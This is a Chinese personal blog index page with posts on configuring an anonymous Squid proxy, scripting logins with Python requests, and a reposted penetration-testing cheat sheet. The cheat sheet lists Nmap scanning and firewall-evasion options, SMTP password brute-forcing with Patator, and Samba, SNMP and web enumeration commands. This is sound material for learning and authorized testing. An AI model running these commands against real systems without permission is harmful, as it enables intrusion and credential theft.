<!doctype html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />






<meta property="og:type" content="website">
<meta property="og:title" content="nina's blog">
<meta property="og:url" content="https://ly-nina.github.io/index.html">
<meta property="og:site_name" content="nina's blog">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="nina's blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://ly-nina.github.io/"/>





  <title> nina's blog </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  














  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">nina's blog</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="https://ly-nina.github.io/2017/11/16/squid-简单安装及高匿配置/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="nina">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="nina's blog">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="nina's blog" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/11/16/squid-简单安装及高匿配置/" itemprop="url">
                  squid 简单安装及高匿配置
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-16T09:43:55+08:00">
                2017-11-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>===============================</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h1 id="国内云服务器好像都会被运营商给ban掉，我用了1周左右有很多网站就开始上不去了。（问客服是说访问的域名需要在他们平台备案过才可以访问-）"><a href="#国内云服务器好像都会被运营商给ban掉，我用了1周左右有很多网站就开始上不去了。（问客服是说访问的域名需要在他们平台备案过才可以访问-）" class="headerlink" title="国内云服务器好像都会被运营商给ban掉，我用了1周左右有很多网站就开始上不去了。（问客服是说访问的域名需要在他们平台备案过才可以访问= =! ）"></a>国内云服务器好像都会被运营商给ban掉，我用了1周左右有很多网站就开始上不去了。（问客服是说访问的域名需要在他们平台备案过才可以访问= =! ）</h1><h2 id="squid-简单安装及高匿配置"><a href="#squid-简单安装及高匿配置" class="headerlink" title="squid 简单安装及高匿配置"></a>squid 简单安装及高匿配置</h2><p>tag: Ubuntu 14.04</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"># sudo apt-get update</div><div class="line"># sudo apt-get install squid</div><div class="line"># sudo vim /etc/squid3 squid.conf</div><div class="line"></div><div class="line">搜索http_port 把默认端口改了（默认是3128）</div><div class="line">搜索manager</div><div class="line">原文是</div><div class="line">http_access allow  localhost manager</div><div class="line">http_access deny manager</div><div class="line"></div><div class="line">修改成</div><div class="line">acl manager1 src xxx.xxx.xxx.xxx</div><div class="line">http_access allow  manager1</div><div class="line">http_access deny manager</div><div class="line">-1，2行的manager1 可自定义名字 </div><div class="line">-src 后面是ip</div><div class="line"></div><div class="line">//在文件最后加上高匿配置</div><div class="line">request_header_access X-Forwarded-For deny all  </div><div class="line">request_header_access From deny all  </div><div class="line">request_header_access Via deny all  </div><div class="line"></div><div class="line">然后保存</div><div class="line">sudo service squid3 restart</div></pre></td></tr></table></figure>
<p>测试：<br>浏览器打开  <a href="http://httpbin.org/get" target="_blank" rel="external">http://httpbin.org/get</a>  看自己ip<br>浏览器配置代理，再次访问，看ip是否变成自己服务器ip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">//查看版本号</div><div class="line">cat /etc/issue</div><div class="line">在好几个linux版本测试过，ubuntu14.04 LTS 是没有问题的，在ubuntu16.04版本开启服务后，测试不成功，暂时不知道是什么问题。后面有需要再解决。</div></pre></td></tr></table></figure>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="https://ly-nina.github.io/2017/10/17/关于requests-session和post/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="nina">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="nina's blog">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="nina's blog" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/10/17/关于requests-session和post/" itemprop="url">
                  关于requests session和post
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-17T17:26:34+08:00">
                2017-10-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import requests</div><div class="line">&gt;&gt;&gt; import json</div><div class="line">&gt;&gt;&gt; from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">&gt;&gt;&gt; headers = &#123;&apos;Accept&apos;:&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,</div><div class="line">&apos;Accept-Encoding&apos;:&apos;gzip, deflate, sdch&apos;,</div><div class="line">&apos;Accept-Language&apos;:&apos;zh-CN,zh;q=0.8&apos;,</div><div class="line">&apos;Cache-Control&apos;:&apos;max-age=0&apos;,</div><div class="line">&apos;Connection&apos;:&apos;keep-alive&apos;,</div><div class="line">&apos;Cookie&apos;:&apos;_xsrf=2|3275a687|0633014ca4533e578b59af222f5e66ec|1505720289&apos;,</div><div class="line">&apos;If-None-Match&apos;:&quot;18acdf8a9f0e2d237e42d54e1d964b16f8c1d486&quot;,</div><div class="line">&apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;,</div><div class="line">&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.3408.400 QQBrowser/9.6.12028.400&apos;&#125;</div><div class="line"># 这边的headers 我是直接复制浏览器上的 Request Headers（F12--里面的network）。用burpsuite也可以看到 Headers</div><div class="line">&gt;&gt;&gt; sess = requests.Session()</div><div class="line">&gt;&gt;&gt; html = sess.get(&apos;http://www.lyincloud.com:8000&apos;, headers=headers)</div><div class="line">&gt;&gt;&gt; x = BeautifulSoup(html.content,&quot;lxml&quot;)</div><div class="line">&gt;&gt;&gt; _xsrf = x.find(&apos;input&apos;, attrs=&#123;&apos;name&apos;: &apos;_xsrf&apos;&#125;)[&apos;value&apos;]</div><div class="line">&gt;&gt;&gt; data = &#123;&apos;username&apos;:&apos;xxx&apos;, &apos;password&apos;:&apos;xxx&apos;, &apos;_xsrf&apos;: _xsrf&#125;</div><div class="line">&gt;&gt;&gt; res = sess.post(&apos;http://www.xxx.com/login&apos;, data=data, headers=headers)</div><div class="line">&gt;&gt;&gt; print(res)</div><div class="line">&lt;Response [200]&gt;</div><div class="line"># 没有加上 _xsrf 参数时，res都是403</div><div class="line">&gt;&gt;&gt; qqq = BeautifulSoup(res.content, &quot;lxml&quot;)</div><div class="line">&gt;&gt;&gt; print(qqq)</div><div class="line"># 这时候就可以看到经过BeautifulSoup处理过的html数据</div></pre></td></tr></table></figure>
<p>没加 _xsrf 参数，会出现403，是因为程序本身做了安全防范，tornado里有个 xsrf 参数，<br>要通过post登录，需要包含这个参数。其实，直接用burp抓包可以发现需要提交的参数</p>
<p><img src="/img/requests-post.png" alt="发送的数据包"></p>
<p>关于session的进一部操作，以后再说</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="https://ly-nina.github.io/2017/06/30/渗透测试工具实战技巧合集/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="nina">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="nina's blog">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="nina's blog" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/06/30/渗透测试工具实战技巧合集/" itemprop="url">
                  渗透测试工具实战技巧合集
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-30T17:47:42+08:00">
                2017-06-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>渗透测试工具实战技巧合集（转）</p>
<p><img src="/img/渗透测试合集.png" alt="渗透测试合集"></p>
<ul>
<li>最好的 NMAP 扫描策略  </li>
<li>Nmap – 躲避防火墙   </li>
<li>Nmap 进行 Web 漏洞扫描</li>
<li>使用 DIRB 爆破目录</li>
<li>Patator – 全能暴力破解测试工具</li>
<li>使用 Fierce 爆破 DNS</li>
<li>使用 Nikto 扫描 Web 服务</li>
<li>扫描 WordPress</li>
<li>HTTP 指纹识别</li>
<li>使用 Skipfish 扫描</li>
<li>使用 NC 扫描</li>
<li>Unicornscan</li>
<li>使用 Xprobe2 识别操作系统指纹</li>
<li>枚举 Samba</li>
<li>枚举 SNMP</li>
<li>实用的 Windows cmd 命令</li>
<li>PuTTY 连接隧道</li>
<li>Meterpreter 端口转发</li>
<li>开启 RDP 服务</li>
<li>关闭 Windows 防火墙</li>
<li>Meterpreter VNC\RDP</li>
<li>使用 Mimikatz</li>
<li>获取哈希值</li>
<li>使用 Hashcat 破解密码</li>
<li>使用 NC 抓取 Banner 信息</li>
<li>使用 NC 在 Windows 上反弹 shell</li>
<li>查找 SUID\SGID root 文件</li>
<li>Python shell</li>
<li>Python\Ruby\PHP HTTP 服务器</li>
<li>获取进程对应的 PID</li>
<li>使用 Hydra 爆破 RDP</li>
<li>挂载远程 Windows 共享文件夹</li>
<li>Kali 下编译 Exploit</li>
<li>Kali 下编译 Windows Exploit</li>
<li>NASM 命令</li>
<li>SSH 穿透</li>
<li>SSH 穿透从一个网络到另一个网络</li>
<li>使用 metasploit 进行穿透</li>
<li>基于 CSV 文件查询 Exploit-DB</li>
<li>MSF Payloads</li>
<li>MSF 生成在 Linux 下反弹的 Meterpreter Shell</li>
<li>MSF 生成反弹 Shell (C Shellcode)</li>
<li>MSF 生成反弹 Python Shell</li>
<li>MSF 生成反弹 ASP Shell</li>
<li>MSF 生成反弹 Bash Shell</li>
<li>MSF 生成反弹 PHP Shell</li>
<li>MSF 生成反弹 Win Shell</li>
<li>Linux 常用安全命令</li>
<li>Windows 缓冲区溢出利用命令</li>
<li>SEH – 结构化异常处理</li>
<li>ROP (DEP)</li>
<li>ASLR – 地址空间格局随机化</li>
<li>寻蛋(EGG Hunter)技术</li>
<li>GDB Debugger 常用命令</li>
<li>BASH 反弹 Shell</li>
<li>PERL 反弹 Shell</li>
<li>RUBY 反弹 Shell</li>
<li>PYTHON 反弹 Shell</li>
<li>PHP 反弹 Shell</li>
<li>JAVA 反弹 Shell</li>
<li>NETCAT 反弹 Shell</li>
<li>TELNET 反弹 Shell</li>
<li>XTERM 反弹 Shell</li>
<li>XSS 备忘录</li>
<li>SSH Over SCTP (使用 Socat)</li>
<li>Metagoofil – 元数据收集工具</li>
<li>利用 Shellshock</li>
<li>获取 Docker 的 Root</li>
<li>使用 DNS 隧道绕过防火墙</li>
<li>编译 Assemble 代码</li>
<li>使用非交互 Shell 打入内网</li>
<li>利用 POST 远程命令执行获取 Shell</li>
<li>以管理员身份在 Win7 上反弹具有系统权限的 Shell</li>
<li>以普通用户身份在 Win7 上反弹具有系统权限的 Shell</li>
<li>MS08-067 – 不使用 Metasploit</li>
<li>通过 MySQL Root 账户实现提权</li>
<li>使用 LD_PRELOAD 注入程序</li>
<li>针对 OpenSSH 用户进行枚举时序攻击</li>
<li>使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道</li>
</ul>
<hr>
<h3 id="最好的Nmap扫描策略"><a href="#最好的Nmap扫描策略" class="headerlink" title="最好的Nmap扫描策略"></a>最好的Nmap扫描策略</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"># 适用所有大小网络最好的 nmap 扫描策略</div><div class="line"></div><div class="line"># 主机发现，生成存活主机列表</div><div class="line">$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24</div><div class="line">$ grep &quot;Status: Up&quot; Discovery.gnmap | cut -f 2 -d &apos; &apos; &gt; LiveHosts.txt</div><div class="line"></div><div class="line"># 端口发现，发现大部分常用端口</div><div class="line"># http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</div><div class="line">$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</div><div class="line">$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt</div><div class="line">$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt</div><div class="line"></div><div class="line"># 端口发现，发现全部端口，但 UDP 端口的扫描会非常慢</div><div class="line">$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt</div><div class="line">$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</div><div class="line"></div><div class="line"># 显示 TCP\UDP 端口</div><div class="line">$ grep &quot;open&quot; FullTCP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;T:&quot;$0&#125;&apos;</div><div class="line">$ grep &quot;open&quot; FullUDP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;U:&quot;$0&#125;&apos;</div><div class="line"></div><div class="line"># 侦测服务版本</div><div class="line">$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</div><div class="line"></div><div class="line"># 扫做系统扫描</div><div class="line">$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</div><div class="line"></div><div class="line"># 系统和服务检测</div><div class="line">$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt</div></pre></td></tr></table></figure>
<h3 id="Nmap-–-躲避防火墙"><a href="#Nmap-–-躲避防火墙" class="headerlink" title="Nmap – 躲避防火墙"></a>Nmap – 躲避防火墙</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"># 分段</div><div class="line">$ nmap -f</div><div class="line"></div><div class="line"># 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)</div><div class="line">$ nmap --mtu 24</div><div class="line"></div><div class="line"># 生成随机数量的欺骗</div><div class="line">$ nmap -D RND:10 [target]</div><div class="line"></div><div class="line"># 手动指定欺骗使用的 IP</div><div class="line">$ nmap -D decoy1,decoy2,decoy3 etc.</div><div class="line"></div><div class="line"># 僵尸网络扫描, 首先需要找到僵尸网络的IP</div><div class="line">$ nmap -sI [Zombie IP] [Target IP]</div><div class="line"></div><div class="line"># 指定源端口号</div><div class="line">$ nmap --source-port 80 IP</div><div class="line"></div><div class="line"># 在每个扫描数据包后追加随机数量的数据</div><div class="line">$ nmap --data-length 25 IP</div><div class="line"></div><div class="line"># MAC 地址欺骗，可以生成不同主机的 MAC 地址</div><div class="line">$ nmap --spoof-mac Dell/Apple/3Com IP</div></pre></td></tr></table></figure>
<h3 id="Nmap-进行-Web-漏洞扫描"><a href="#Nmap-进行-Web-漏洞扫描" class="headerlink" title="Nmap 进行 Web 漏洞扫描"></a>Nmap 进行 Web 漏洞扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">cd /usr/share/nmap/scripts/</div><div class="line">wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz</div><div class="line">nmap -sS -sV --script=vulscan/vulscan.nse target</div><div class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target</div><div class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target</div><div class="line">nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target</div><div class="line">nmap -sV --script=vuln target</div><div class="line">nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target</div><div class="line">使用 DIRB 爆破目录</div><div class="line"></div><div class="line">注：DIRB 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster， 国内的御剑等等。</div><div class="line"></div><div class="line">dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt</div></pre></td></tr></table></figure>
<h3 id="Patator-–-全能暴力破解测试工具"><a href="#Patator-–-全能暴力破解测试工具" class="headerlink" title="Patator – 全能暴力破解测试工具"></a>Patator – 全能暴力破解测试工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># git clone https://github.com/lanjelot/patator.git /usr/share/patator</div><div class="line"></div><div class="line"># SMTP 爆破</div><div class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst</div><div class="line">$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</div><div class="line">$ patator smtp_login host=192.168.17.129 helo=&apos;ehlo 192.168.17.128&apos; user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</div><div class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=&apos;incorrect password or account name&apos;</div></pre></td></tr></table></figure>
<h3 id="使用-Fierce-爆破-DNS"><a href="#使用-Fierce-爆破-DNS" class="headerlink" title="使用 Fierce 爆破 DNS"></a>使用 Fierce 爆破 DNS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：subDomainsBrute 和 SubBrute 等等</div><div class="line"></div><div class="line"># http://ha.ckers.org/fierce/</div><div class="line">$ ./fierce.pl -dns example.com</div><div class="line">$ ./fierce.pl –dns example.com –wordlist myWordList.txt</div></pre></td></tr></table></figure>
<h3 id="使用-Nikto-扫描-Web-服务"><a href="#使用-Nikto-扫描-Web-服务" class="headerlink" title="使用 Nikto 扫描 Web 服务"></a>使用 Nikto 扫描 Web 服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nikto -C all -h http://IP</div></pre></td></tr></table></figure>
<h3 id="扫描-WordPress"><a href="#扫描-WordPress" class="headerlink" title="扫描 WordPress"></a>扫描 WordPress</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan</div><div class="line">./wpscan –url http://IP/ –enumerate p</div></pre></td></tr></table></figure>
<h3 id="HTTP-指纹识别"><a href="#HTTP-指纹识别" class="headerlink" title="HTTP 指纹识别"></a>HTTP 指纹识别</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip</div><div class="line">cd httprint_301/linux/</div><div class="line">./httprint -h http://IP -s signatures.txt</div></pre></td></tr></table></figure>
<h3 id="使用-Skipfish-扫描"><a href="#使用-Skipfish-扫描" class="headerlink" title="使用 Skipfish 扫描"></a>使用 Skipfish 扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。</div><div class="line"></div><div class="line">skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP</div></pre></td></tr></table></figure>
<h3 id="使用-NC-扫描"><a href="#使用-NC-扫描" class="headerlink" title="使用 NC 扫描"></a>使用 NC 扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -v -w 1 target -z 1-1000</div><div class="line">for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done</div></pre></td></tr></table></figure>
<h3 id="Unicornscan"><a href="#Unicornscan" class="headerlink" title="Unicornscan"></a>Unicornscan</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">注：Unicornscan 是一个信息收集和安全审计的工具。</div><div class="line"></div><div class="line">us -H -msf -Iv 192.168.56.101 -p 1-65535</div><div class="line">us -H -mU -Iv 192.168.56.101 -p 1-65535</div><div class="line"></div><div class="line">-H 在生成报告阶段解析主机名</div><div class="line">-m 扫描类型 (sf - tcp, U - udp)</div><div class="line">-Iv - 详细</div></pre></td></tr></table></figure>
<h3 id="使用-Xprobe2-识别操作系统指纹"><a href="#使用-Xprobe2-识别操作系统指纹" class="headerlink" title="使用 Xprobe2 识别操作系统指纹"></a>使用 Xprobe2 识别操作系统指纹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xprobe2 -v -p tcp:80:open IP</div></pre></td></tr></table></figure>
<h3 id="枚举-Samba"><a href="#枚举-Samba" class="headerlink" title="枚举 Samba"></a>枚举 Samba</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">nmblookup -A target</div><div class="line">smbclient //MOUNT/share -I target -N</div><div class="line">rpcclient -U &quot;&quot; target</div><div class="line">enum4linux target</div></pre></td></tr></table></figure>
<h3 id="枚举-SNMP"><a href="#枚举-SNMP" class="headerlink" title="枚举 SNMP"></a>枚举 SNMP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">snmpget -v 1 -c public IP</div><div class="line">snmpwalk -v 1 -c public IP</div><div class="line">snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP</div></pre></td></tr></table></figure>
